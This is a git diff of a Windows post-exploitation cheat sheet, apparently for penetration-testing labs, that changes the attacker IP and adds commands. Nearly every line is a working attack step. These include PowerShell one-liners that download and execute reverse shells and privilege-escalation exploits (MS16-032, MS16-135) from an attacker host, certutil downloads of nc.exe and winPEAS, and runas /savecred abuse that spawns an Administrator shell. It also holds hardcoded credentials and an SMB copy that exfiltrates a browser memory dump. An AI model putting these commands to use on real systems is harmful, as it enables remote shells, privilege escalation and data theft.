@@ -1,22 +1,24 @@
 #find file 
 dir directory\*.txt /s /p
+dir C:\proof.txt /s /p
+dir C:\network-secret.txt /s /p
 
 #Run file remotely
-powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Invoke-PowerShellTcp.ps1')
+powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Invoke-PowerShellTcp.ps1')
 
-powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Invoke-PowerShellTcp.ps1')"
+powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Invoke-PowerShellTcp.ps1')"
 
-powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Sherlock.ps1'); Find-AllVulns "
+powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Sherlock.ps1'); Find-AllVulns "
 
-powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/powerUp.ps1');"
+powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/powerUp.ps1');"
 
-powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/jaws-enum.ps1');"
+powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/jaws-enum.ps1');"
 
-powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Sherlock.ps1'); "
+powershell -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Sherlock.ps1'); "
 
-powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Sherlock.ps1')
+powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Sherlock.ps1')
 
-powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/powershell_attack.txt')
+powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/powershell_attack.txt')
 
 #Encoded command powershell
 
@@ -35,48 +37,58 @@ type letter.txt | more
 
 #Download file
 
-$url = "http://10.10.16.112/powerUp.ps1";$output = "C:\Users\Chase\Desktop\powerUp.ps1";$wc = New-Object System.Net.WebClient;$wc.DownloadFile($url, $output);
+$url = "http://192.168.119.149/powerUp.ps1";$output = "C:\Users\Chase\Desktop\powerUp.ps1";$wc = New-Object System.Net.WebClient;$wc.DownloadFile($url, $output);
 
-certutil -urlcache -split -f http://10.10.16.112/nc.exe nc.exe
+certutil -urlcache -split -f http://192.168.119.149/nc.exe nc.exe
 
-(new-object System.Net.WebClient).DownloadFile('http://10.10.16.112/powerUp.ps1','C:\Windows\Temp\test\powerup.ps1')
+certutil -urlcache -split -f http://192.168.119.149/winPEAS/winPEASx64.exe win.exe
 
-(new-object System.Net.WebClient).DownloadFile('http://10.10.16.112/jaws-enum.ps1','C:\Windows\Temp\test\jaws-enum.ps1')
+(new-object System.Net.WebClient).DownloadFile('http://192.168.119.149/powerUp.ps1','C:\Windows\Temp\test\powerup.ps1')
 
-(new-object System.Net.WebClient).DownloadFile('http://10.10.16.112/Sherlock.ps1','C:\Windows\Temp\test\Sherlock.ps1')
+(new-object System.Net.WebClient).DownloadFile('http://192.168.119.149/jaws-enum.ps1','C:\Windows\Temp\test\jaws-enum.ps1')
 
-(new-object System.Net.WebClient).DownloadFile('http://10.10.16.112/windows-exploit-suggester.py','C:\Windows\Temp\test\windows-exploit-suggester.py')
+(new-object System.Net.WebClient).DownloadFile('http://192.168.119.149/Sherlock.ps1','C:\Windows\Temp\test\Sherlock.ps1')
+
+(new-object System.Net.WebClient).DownloadFile('http://192.168.119.149/windows-exploit-suggester.py','C:\Windows\Temp\test\windows-exploit-suggester.py')
 
 
-powershell (new-object System.Net.WebClient).DownloadFile('http://10.10.16.112/MS16-032.ps1','C:\Users\kostas\Desktop\MS16-032.ps1')
+powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.119.149/MS16-032.ps1','C:\Users\kostas\Desktop\MS16-032.ps1')
 
-powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/MS16-135.ps1')
+powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/MS16-135.ps1')
 
 #Auto-Login
 
 $passwd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;$creds =New-Object System.Management.Automation.PSCredential('administrator', $passwd)
 
-Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.16.112/Invoke-PowerShellTcp.ps1')" -Credential $creds
+Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://192.168.119.149/Invoke-PowerShellTcp.ps1')" -Credential $creds
 
 
 
 #Runas
 cat shell3 | iconv --to-code UTF-16LE |   base64 -w 0
 
-runas /profile /savecred /user:ACCESS\Administrator "cmd /c ping -n 1 10.10.16.112" 
+runas /profile /savecred /user:ACCESS\Administrator "cmd /c ping -n 1 192.168.119.149" 
 
-runas /profile /savecred /user:ACCESS\Administrator "powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.112/Invoke-PowerShellTcp.ps1')" 
-
-
+runas /profile /savecred /user:ACCESS\Administrator "powershell -C IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.149/Invoke-PowerShellTcp.ps1')" 
 
 Another simple way is
 runas /user:ACCESS\Administrator /savecred "powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.36/Invoke-PowerShellTcp3.ps1')"
 
 
+#Invoke command (Run a script as another user with creds found)
+$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM"; 
+
+$credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris", $password;
+
+Invoke-Command -ComputerName LOCALHOST -ScriptBlock { whoami } -credential $credential;
+
+
+
+
 #copy big file 
 */opt/impacket/examples/smbserver.py test . -smb2support -username guest -password guest (on linux)
 
-*net use x: \\10.10.16.112\test  /user:guest guest 
+*net use x: \\192.168.119.149\test  /user:guest guest 
 *cmd /c "copy firefox.exe_200131_084937.dmp x:\"
 
 #Connect as Admin 
